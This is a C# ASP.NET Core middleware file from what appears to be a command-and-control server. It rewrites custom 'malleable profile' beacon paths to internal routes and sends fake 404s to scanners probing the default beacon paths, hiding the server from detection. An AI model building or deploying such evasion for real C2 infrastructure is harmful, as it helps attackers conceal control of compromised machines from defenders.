using LibraNextgen.Service.Services;

namespace LibraNextgen.Service.Middleware;

/// <summary>
/// Routes agent traffic by the active malleable profile and rejects scanners
/// that hit the default beacon paths while a custom profile is active.
///
/// Register path stays fixed (bootstrap entry). Heartbeat/result paths are
/// rewritten from the profile paths to the internal routes, and requests to the
/// well-known default paths are answered with a fake 404 when a custom profile
/// is active — so the server does not trust the agent's self-restraint.
/// </summary>
public class ProfileFingerprintMiddleware
{
    private const string DefaultHeartbeat = "/api/beacon/heartbeat";
    private const string DefaultResult = "/api/beacon/result";

    private readonly RequestDelegate _next;

    public ProfileFingerprintMiddleware(RequestDelegate next)
    {
        _next = next;
    }

    public async Task InvokeAsync(HttpContext context, ProfileService profileService)
    {
        var path = context.Request.Path.Value ?? "/";

        var profile = await profileService.GetActiveProfileAsync();
        var profileHeartbeat = profile.GetHeartbeatUrl("/api/beacon");
        var profileResult = profile.GetResultUrl("/api/beacon");

        // Custom profile paths rewrite to the internal routes.
        if (path == profileHeartbeat && profileHeartbeat != DefaultHeartbeat)
        {
            context.Request.Path = DefaultHeartbeat;
        }
        else if (path == profileResult && profileResult != DefaultResult)
        {
            context.Request.Path = DefaultResult;
        }
        // Scanner hits the well-known default path while a custom profile is
        // active → answer with a plain 404 (do not reveal the real route).
        else if ((path == DefaultHeartbeat && profileHeartbeat != DefaultHeartbeat) ||
                 (path == DefaultResult && profileResult != DefaultResult))
        {
            context.Response.StatusCode = 404;
            context.Response.ContentType = "text/plain";
            await context.Response.WriteAsync("404 Not Found");
            return;
        }

        await _next(context);
    }
}
